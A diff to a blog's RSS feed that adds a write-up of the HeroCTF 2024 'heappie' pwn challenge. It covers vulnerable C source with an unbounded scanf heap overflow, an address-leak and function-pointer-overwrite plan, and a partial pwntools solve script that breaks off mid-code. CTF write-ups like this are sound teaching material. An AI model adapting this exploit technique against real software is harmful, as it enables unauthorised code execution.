@@ -240,6 +240,243 @@ In option 5, this is not the case. The <code>drop_in_place</code> function only 
         </item>
         
         <item>
+            <title>🇬🇧 HeroCTF 2024 - pwn/heappie</title>
+            <link>/posts/2024/10/heroctf-2024-pwn/heappie/</link>
+            <pubDate>Sun, 27 Oct 2024 00:00:00 +0000</pubDate>
+            
+            <guid>/posts/2024/10/heroctf-2024-pwn/heappie/</guid>
+            <description>&lt;h3 id=&#34;table-of-contents&#34;&gt;Table of contents&lt;/h3&gt;
+&lt;hr&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#file-information&#34;&gt;File Information&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#looking-for-a-vulnerability&#34;&gt;Looking for a vulnerability&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#exploit-plan-tldr&#34;&gt;Exploit Plan (TLDR)&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#solve-script&#34;&gt;Solve Script&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;a href=&#34;/posts/2024/10/heroctf-2024-pwn/heappie/#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
+&lt;p&gt;Writeup for the second &lt;code&gt;pwn&lt;/code&gt; challenge from HeroCTF 2024.&lt;/p&gt;
+&lt;h2 id=&#34;description&#34;&gt;Description&lt;/h2&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
+&lt;p&gt;We are given the binary and the source code, which is written in C.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-css&#34; data-lang=&#34;css&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;checksec&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[*]&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/home/conflict/ctfs/heroctf2024/pwn/heappie/heappie&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Arch&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;       &lt;span style=&#34;color:#f92672&#34;&gt;amd64-64-little&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Full&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;RELRO&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stack&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Canary&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;found&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;         &lt;span style=&#34;color:#f92672&#34;&gt;NX&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;PIE&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;SHSTK&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;      &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;IBT&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;Enabled&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Stripped&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;   &lt;span style=&#34;color:#f92672&#34;&gt;No&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;Debuginfo&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;Yes&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;heappie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;ELF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;64-bit&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;LSB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;pie&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;executable&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;x86-64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;version&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;SYSV&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;),&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;dynamically&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;linked&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;interpreter&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;lib64&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;ld-linux-x86-64&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;so&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;BuildID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;b1454a58ded17f3fd2fef3a2d6a30f5cd2f104cd&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;GNU&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;Linux&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;3&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;with&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;debug_info&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;not&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;stripped&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Reading the source code, we see that we have four options:&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h3 id="table-of-contents">Table of contents</h3>
+<hr>
+<ul>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#file-information">File Information</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#looking-for-a-vulnerability">Looking for a vulnerability</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#exploit-plan-tldr">Exploit Plan (TLDR)</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#solve-script">Solve Script</a></p>
+</li>
+<li>
+<p><a href="/posts/2024/10/heroctf-2024-pwn/heappie/#conclusion">Conclusion</a></p>
+</li>
+</ul>
+<hr>
+<h2 id="note">Note</h2>
+<p>Writeup for the second <code>pwn</code> challenge from HeroCTF 2024.</p>
+<h2 id="description">Description</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>Heappie is a simple application that allows you to save and play your favorite songs. Find a way to exploit it and read the flag.
+</span></span></code></pre></div><h2 id="file-information">File information</h2>
+<p>We are given the binary and the source code, which is written in C.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-css" data-lang="css"><span style="display:flex;"><span><span style="color:#f92672">checksec</span> <span style="color:#f92672">heappie</span><span style="color:#f92672">;</span> <span style="color:#f92672">file</span> <span style="color:#f92672">heappie</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[*]</span> <span style="color:#e6db74">&#39;/home/conflict/ctfs/heroctf2024/pwn/heappie/heappie&#39;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Arch</span><span style="color:#f92672">:</span>       <span style="color:#f92672">amd64-64-little</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">RELRO</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Full</span> <span style="color:#f92672">RELRO</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stack</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Canary</span> <span style="color:#f92672">found</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">NX</span><span style="color:#f92672">:</span>         <span style="color:#f92672">NX</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">PIE</span><span style="color:#f92672">:</span>        <span style="color:#f92672">PIE</span> <span style="color:#f92672">enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">SHSTK</span><span style="color:#f92672">:</span>      <span style="color:#f92672">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">IBT</span><span style="color:#f92672">:</span>        <span style="color:#f92672">Enabled</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Stripped</span><span style="color:#f92672">:</span>   <span style="color:#f92672">No</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">Debuginfo</span><span style="color:#f92672">:</span>  <span style="color:#f92672">Yes</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">heappie</span><span style="color:#f92672">:</span> <span style="color:#f92672">ELF</span> <span style="color:#f92672">64-bit</span> <span style="color:#f92672">LSB</span> <span style="color:#f92672">pie</span> <span style="color:#f92672">executable</span><span style="color:#f92672">,</span> <span style="color:#f92672">x86-64</span><span style="color:#f92672">,</span> <span style="color:#f92672">version</span> <span style="color:#f92672">1</span> <span style="color:#f92672">(</span><span style="color:#f92672">SYSV</span><span style="color:#f92672">),</span> <span style="color:#f92672">dynamically</span> <span style="color:#f92672">linked</span><span style="color:#f92672">,</span> <span style="color:#f92672">interpreter</span> <span style="color:#f92672">/</span><span style="color:#f92672">lib64</span><span style="color:#f92672">/</span><span style="color:#f92672">ld-linux-x86-64</span>.<span style="color:#a6e22e">so</span>.<span style="color:#a6e22e">2</span><span style="color:#f92672">,</span> <span style="color:#f92672">BuildID</span><span style="color:#f92672">[</span><span style="color:#f92672">sha1</span><span style="color:#f92672">]=</span><span style="color:#f92672">b1454a58ded17f3fd2fef3a2d6a30f5cd2f104cd</span><span style="color:#f92672">,</span> <span style="color:#f92672">for</span> <span style="color:#f92672">GNU</span><span style="color:#f92672">/</span><span style="color:#f92672">Linux</span> <span style="color:#f92672">3</span>.<span style="color:#a6e22e">2</span>.<span style="color:#a6e22e">0</span><span style="color:#f92672">,</span> <span style="color:#f92672">with</span> <span style="color:#f92672">debug_info</span><span style="color:#f92672">,</span> <span style="color:#f92672">not</span> <span style="color:#f92672">stripped</span>
+</span></span></code></pre></div><p>Reading the source code, we see that we have four options:</p>
+<ol>
+<li>Add Music</li>
+<li>Play Music</li>
+<li>Delete Music</li>
+<li>Show Playlist</li>
+</ol>
+<p>Additionally, we have a <code>Music</code> struct that holds a play function, a title, an artist, and a description.</p>
+<p>When creating a music entry, if we add sound, a random function is chosen to be the music&rsquo;s <code>play()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_1</span>(Music<span style="color:#f92672">*</span> music) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 1: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_2</span>(Music<span style="color:#f92672">*</span> music) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 2: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">play_3</span>(Music<span style="color:#f92672">*</span> music) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Playing music 3: %s by %s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span><span style="color:#f92672">*</span> <span style="color:#a6e22e">choose_random_play</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> choice <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">3</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span>(choice) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">0</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_1;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_2;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">void</span><span style="color:#f92672">*</span>)play_3;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>[...]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (add_music <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;y&#39;</span>) {
+</span></span><span style="display:flex;"><span>        music<span style="color:#f92672">-&gt;</span>play <span style="color:#f92672">=</span> <span style="color:#a6e22e">choose_random_play</span>();
+</span></span><span style="display:flex;"><span>[...]
+</span></span></code></pre></div><p>The <code>show_playlist()</code> function displays the address to which <code>music-&gt;play()</code> points:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">%d. %s by %s (song: %p)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, i <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, music<span style="color:#f92672">-&gt;</span>title, music<span style="color:#f92672">-&gt;</span>artist, music<span style="color:#f92672">-&gt;</span>play);
+</span></span></code></pre></div><p>And most importantly, there is a <code>win()</code> function!</p>
+<h2 id="looking-for-a-vulnerability">Looking for a vulnerability</h2>
+<p>Our goal is to call the <code>win()</code> function, but as indicated in the checksec output, <code>PIE</code> is enabled. This means our first step will be to figure out the <code>ELF</code>&rsquo;s base address.</p>
+<p>To do so, we can calculate it from the address shown by the <code>show_playlist()</code> function.
+We can determine which <code>play_?()</code> function was used by playing the music (<em>option 2</em>) and retrieving the number from the output.</p>
+<p>Once we know <code>win()</code>&rsquo;s address, the next step is to find a way to execute it.</p>
+<p>When creating a music entry, this block of code is executed:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music title: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, music<span style="color:#f92672">-&gt;</span>title);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music artist: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, music<span style="color:#f92672">-&gt;</span>artist);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Enter music description: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">scanf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, music<span style="color:#f92672">-&gt;</span>description);
+</span></span></code></pre></div><p>The last <code>scanf</code> call is vulnerable to an <em>overflow</em> because it does not check the size of the input.</p>
+<p>Since music blocks are next to each other, overflowing the description of a music entry will overwrite the <em>next music</em>&rsquo;s pointer to <code>play()</code>, followed by its title, then its artist&hellip;.</p>
+<p>We have to be careful <em>not</em> to add sound to the next music entry so that the pointer to <code>play()</code> is not overwritten by the program.</p>
+<h2 id="exploit-plan-tldr">Exploit Plan (TLDR)</h2>
+<ul>
+<li>Make a music entry with sound.</li>
+<li>Show the playlist: get the <code>music-&gt;play()</code> address.</li>
+<li>Play the music: determine which <code>play_?()</code> function corresponds to it.</li>
+<li>Delete the music entry.</li>
+<li>Create a music entry with the payload in the description: <em>overflow</em> the next music&rsquo;s <code>play()</code> pointer with <code>win()</code>.</li>
+<li>Create a music entry without sound.</li>
+<li>Listen to the music: call <code>win()</code>.</li>
+</ul>
+<h2 id="solve-script">Solve Script</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>update(arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;x86_64&#39;</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./heappie&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>libc
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>REMOTE:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;pwn.heroctf.fr&#34;</span>, <span style="color:#ae81ff">6000</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#34;./heappie&#34;</span>)
+</span></span><span style="display:flex;"><span>        gdb<span style="color:#f92672">.</span>attach(r)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> start()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =-=-=- Un jour je serai le meilleur pwner -=-=-=</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># =============================================================================</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>play_offsets <span style="color:#f92672">=</span> [elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_1&#34;</span>], elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_2&#34;</span>], elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;play_3&#34;</span>]]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">make_music</span>(sound, title, artist, desc):
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt; &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;1&#39;</span>)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;(y/n): &#39;</span>, sound)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;title: &#39;</span>, title)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;artist: &#39;</span>, artist)
+</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;description: &#39;</span>, desc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>make_music(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;y&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read playlist to get play_? address</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;4&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ignore garbage</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;song: &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>play_address <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[<span style="color:#ae81ff">0</span>], <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># read music</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&gt;&gt;&#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;index: &#39;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ignore garbage</span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;music &#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># get which play function was used</span>
+</span></span><span style="display:flex;"><span>play_number <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span>)<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;:&#39;</span>)[<span style="color:#ae81ff">0</span>])
+</span></span><span style="display:flex;"><span>
